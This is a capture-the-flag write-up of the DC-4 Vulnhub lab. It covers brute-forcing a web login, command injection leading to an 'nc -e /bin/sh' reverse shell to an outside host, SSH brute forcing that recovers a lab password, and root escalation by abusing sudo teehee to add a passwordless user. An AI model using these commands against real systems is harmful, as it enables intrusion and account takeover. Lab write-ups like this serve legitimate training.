We are going to pwn DC 4 by DCAU7 from Vulnhub


## Description
>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
Unlike the previous DC releases, this one is designed primarily for  beginners/intermediates. There is only one flag, but technically,  multiple entry points and just like last time, no clues.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always  tweet me at @DCAU7 for assistance to get you going again. But take note:  I won't give you the answer, instead, I'll give you an idea about how  to move forward.

Lets Begin with our Initial Scan

## Nmap Scan Results

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Looks like only HTTP port is open so lets start our Gobuster

## Gobuster Result

```

It looks like login Page 
So i tried some normal sql injection but none worked so lets try bruteforce
We can use Burp Intruder for that

Attack type : Cluster Bomb

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/dc4/3.png)

Now in payload , load wordlist and start attack!

This one gives different length it might be the password <br/>

And yes I logged in.
After login I got a page Command.php<br/>

## Getting Shell

It looks like , it executes system commands.
So I intercept the command with burp and got a reverse shell.

> nc -e /bin/sh 10.0.2.18 1234 


![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/dc4/9.png)

We got a Shell!!

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/dc4/10.png)

So while searching for anything usefull i found ``old-passwords.bak``

Since i found it in jim directory, lets bruteforce with ``jim``

## Getting User Jim

Lets start bruteforcing the ssh port using hydra

> hydra - a very fast network logon cracker which supports many different services

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/dc4/11.png)

we found the password is ``jim:jibril04``

Found some users too

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/dc4/12.png)

## Getting User Charles

While Checking jim directory there is ``mbox``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/dc4/13.png)

Since it looks like mail we check ``/var/mail``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/dc4/14.png)

It gives password for ``charles`` I su to charles

## Privilege Escalation

``sudo -l`` shows we can run ``teehee`` with root permission

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/dc4/15.png)

It looks like we can overwrite any file so i created new user with root permission without password!

Got ROOT !!

``Flag``
